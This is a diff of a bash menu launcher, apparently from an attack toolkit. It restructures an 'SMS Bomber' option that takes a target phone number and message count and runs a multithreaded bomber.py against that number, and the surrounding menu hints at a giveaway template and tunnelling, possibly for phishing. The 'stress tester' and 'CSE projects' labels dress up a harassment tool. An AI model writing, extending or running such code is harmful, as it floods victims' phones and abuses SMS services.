@@ -126,6 +126,24 @@ echo -e "  ${B}[4]${NC} SMS Stress Tester (API Flooding)" # New Option
 
 read -p "  Selection > " option
 
+if [[ $option == "4" ]]; then
+    echo -e "\n${Y}[*] Entering Advanced SMS Bomber Mode...${NC}"
+    read -p "  Enter Target Number: " target_num
+    read -p "  Enter Number of SMS (e.g., 50): " sms_count
+    
+    # Audit Logging (Good for CSE projects)
+    echo "[$(date)] Sent $sms_count SMS to $target_num" >> logs/bomber_history.txt
+    
+    cd modules/sms/
+    # Running with Python3 - Ensure requirements are installed
+    python3 bomber.py "$target_num" -N "$sms_count" -T 20 -C 91
+    
+    cd ../../
+    echo -e "\n${G}[+] Bombing Task Complete.${NC}"
+    sleep 2
+    exec ./techyfatcat.sh
+fi
+
 
 echo
 echo -e "${G}Select Tunnel Method:${NC}"
@@ -164,28 +182,6 @@ elif [[ $option == "3" ]]; then
     TARGET_DIR="$ROOT_DIR/modules/giveaway"
     LOG_FILE="$ROOT_DIR/logs/output.txt"
     echo -e "\n${Y}[*] Loading Giveaway template...${NC}"
-
-############################################
-# SMS MODULE LOGIC
-############################################
-
-elif [[ $option == "4" ]]; then
-    echo -e "\n${Y}[*] Entering Advanced SMS Bomber Mode...${NC}"
-    read -p "  Enter Target Number (10 digits): " target_num
-    read -p "  Enter Number of SMS (e.g., 50): " sms_count
-    
-    # Move into the directory so the script can find services.yaml
-    cd modules/sms/
-    
-    # Run the advanced engine
-    # -N is for number of SMS, -T is for threads
-    python3 bomber.py "$target_num" -N "$sms_count" -T 20 -C 91
-    
-    # Move back to root after finishing
-    cd ../../
-    echo -e "\n${G}[+] Bombing Task Complete.${NC}"
-    sleep 2
-    ./techyfatcat.sh
 
 else
 
